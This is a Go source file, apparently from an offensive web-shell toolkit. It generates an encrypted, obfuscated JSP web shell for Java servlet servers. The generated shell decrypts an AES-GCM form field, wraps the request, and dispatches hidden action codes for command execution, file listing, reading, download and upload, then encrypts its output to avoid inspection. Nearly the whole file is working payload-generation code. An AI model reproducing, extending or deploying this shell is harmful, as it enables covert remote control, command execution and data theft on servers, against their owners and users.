package jsp

import (
	"strings"

	"github.com/Yliken/redbeanshellcore/crypto/fragment"
)

const (
	// DefaultCryptoField is the form field carrying the encrypted body.
	DefaultCryptoField = "__crypto"
)

// CryptoBodyShellSource returns the body-mode AES-GCM encrypted static shell.
// The shell decrypts the whole form, rebuilds it through an
// HttpServletRequestWrapper, and then executes the original templates without
// changing any template source.
func CryptoBodyShellSource(key []byte) string {
	return CryptoBodyShellSourceWith(key, DefaultObfuscator())
}

// CryptoBodyShellSourceWith returns the body-mode encrypted static shell with
// a custom Obfuscator.
func CryptoBodyShellSourceWith(key []byte, obf *Obfuscator) string {
	return CryptoBodyShellSourceWithFragment(aesgcmFragment(key), obf)
}

// CryptoBodyShellSourceWithFragment injects a CryptoFragment into the
// body-mode encrypted static shell.
func CryptoBodyShellSourceWithFragment(frag fragment.Fragment, obf *Obfuscator) string {
	af := obf.ActionField()
	acInfo := obf.ActionCode("info")
	acExec := obf.ActionCode("exec")
	acList := obf.ActionCode("file.list")
	acRead := obf.ActionCode("file.read")
	acDown := obf.ActionCode("file.download")
	acUp := obf.ActionCode("file.upload")

	tpl := &JSPTemplates{}
	infoCode := pwWrap(tpl.Info())
	execCode := pwWrap(tpl.Exec())
	listCode := pwWrap(tpl.FileList())
	readCode := pwWrap(tpl.FileRead())
	downCode := pwWrap(tpl.FileDownload())
	upCode := pwWrap(tpl.FileUpload())

	// Jasper generates _jspService with a final request parameter, so the
	// generated operations are rewired to the wrapped request instead of
	// reassigning request itself. Template sources stay unchanged.
	infoCode = strings.ReplaceAll(infoCode, "request.getParameter", "__rbs_req.getParameter")
	execCode = strings.ReplaceAll(execCode, "request.getParameter", "__rbs_req.getParameter")
	listCode = strings.ReplaceAll(listCode, "request.getParameter", "__rbs_req.getParameter")
	readCode = strings.ReplaceAll(readCode, "request.getParameter", "__rbs_req.getParameter")
	downCode = strings.ReplaceAll(downCode, "request.getParameter", "__rbs_req.getParameter")
	upCode = strings.ReplaceAll(upCode, "request.getParameter", "__rbs_req.getParameter")

	return cryptoImport() + "\n" +
		`<%!` + frag.DecryptJava() + frag.EncryptJava() + bodyParseHelper() + `%>` + "\n" +
		`<%
try{
java.io.StringWriter __sw=new java.io.StringWriter();
java.io.PrintWriter __pw=new java.io.PrintWriter(__sw);
javax.servlet.http.HttpServletRequest __rbs_req=request;
String __rbs_c=request.getParameter("` + DefaultCryptoField + `");
if(__rbs_c!=null&&!__rbs_c.isEmpty()){
  final java.util.Map<String,String[]> __rbs_params=__rbs_parseBody(dec(__rbs_c));
  __rbs_req=new javax.servlet.http.HttpServletRequestWrapper(__rbs_req){
    public String getParameter(String n){String[] v=__rbs_params.get(n);return (v!=null&&v.length>0)?v[0]:null;}
    public String[] getParameterValues(String n){return __rbs_params.get(n);}
    public java.util.Map<String,String[]> getParameterMap(){return __rbs_params;}
  };
}
String z0=__rbs_req.getParameter("` + af + `");
if("` + acInfo + `".equals(z0)){` + infoCode + `
}else if("` + acExec + `".equals(z0)){` + execCode + `
}else if("` + acList + `".equals(z0)){` + listCode + `
}else if("` + acRead + `".equals(z0)){` + readCode + `
}else if("` + acDown + `".equals(z0)){` + downCode + `
}else if("` + acUp + `".equals(z0)){` + upCode + `
}else{__pw.print("ERR:UNKNOWN_ACTION");}
__pw.flush();out.print(enc(__sw.toString()));
}catch(Exception ex){out.print(enc("ERR:"+ex.getMessage()));}
	%>`
}

// CryptoShellMeta returns the crypto mode and key fingerprint used by shells
// generated from the given key. Client tooling can compare it against the
// configured client crypto to avoid deploying a mismatched shell.
func CryptoShellMeta(key []byte) (mode string, fingerprint string) {
	frag := aesgcmFragment(key)
	return frag.Name(), frag.KeyFingerprint()
}

func bodyParseHelper() string {
	return `java.util.Map<String,String[]> __rbs_parseBody(String s)throws Exception{
java.util.Map<String,String[]> m=new java.util.LinkedHashMap<String,String[]>();
if(s==null||s.isEmpty())return m;
for(String pair:s.split("&")){
  int eq=pair.indexOf('=');
  if(eq<=0)continue;
  String k=pair.substring(0,eq);
  String v=new String(java.util.Base64.getDecoder().decode(pair.substring(eq+1)),"UTF-8");
  m.put(k,new String[]{v});
}
return m;}`
}
